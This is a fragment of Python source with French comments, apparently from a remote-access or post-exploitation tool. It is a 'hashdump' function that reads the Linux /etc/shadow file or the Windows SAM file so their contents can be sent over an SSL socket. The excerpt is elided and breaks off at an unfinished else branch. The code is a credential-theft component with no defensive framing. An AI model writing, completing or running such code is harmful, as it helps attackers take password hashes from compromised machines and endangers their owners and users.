...
def hashdump(ssl_socket):
    ...
    if os_type == "posix":  # Test si la machine est une Linux
        with open('/etc/shadow', 'r') as fichier_shadow:  # Ouverture du fichier shadow
            hashdump_to_send = fichier_shadow.read()  # Enregistrement du contenu du fichier shadow
    elif os_type == "nt":  # Test si la machine est une Windows
        with open('C:/Windows/System32/config/SAM', 'r') as fichier_sam: # Ouverture du fichier SAM
            hashdump_to_send = fichier_sam.read() # Enregistrement du contenu du fichier SAM
    else:
